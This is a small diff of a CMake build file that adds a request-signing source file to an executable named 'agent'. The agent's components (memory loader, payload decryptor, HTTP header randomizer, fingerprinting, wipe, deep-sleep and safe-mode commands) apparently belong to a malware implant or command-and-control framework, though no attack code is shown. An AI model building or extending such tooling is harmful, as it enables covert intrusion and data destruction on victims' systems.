@@ -27,7 +27,7 @@ target_link_libraries(CmdWipe CommandCore)
 target_link_libraries(CmdDeepSleep CommandCore)
 target_link_libraries(CmdSafeMode CommandCore)
 
-add_executable(agent src/main.cpp src/Loader.cpp src/MemoryLoader.cpp src/PayloadDecryptor.cpp src/Globals.cpp src/HttpHeaderRandomizer.cpp src/ConfigModule.cpp src/Fingerprint.cpp src/Crypto.cpp src/KeyExchange.cpp src/Wipe.cpp)
+add_executable(agent src/main.cpp src/Loader.cpp src/MemoryLoader.cpp src/PayloadDecryptor.cpp src/Globals.cpp src/HttpHeaderRandomizer.cpp src/ConfigModule.cpp src/RequestSigner.cpp src/Fingerprint.cpp src/Crypto.cpp src/KeyExchange.cpp src/Wipe.cpp)
 target_link_libraries(agent dl OpenSSL::Crypto CURL::libcurl CommandCore uuid)
 target_compile_definitions(agent PRIVATE STATIC_AGENT)
 
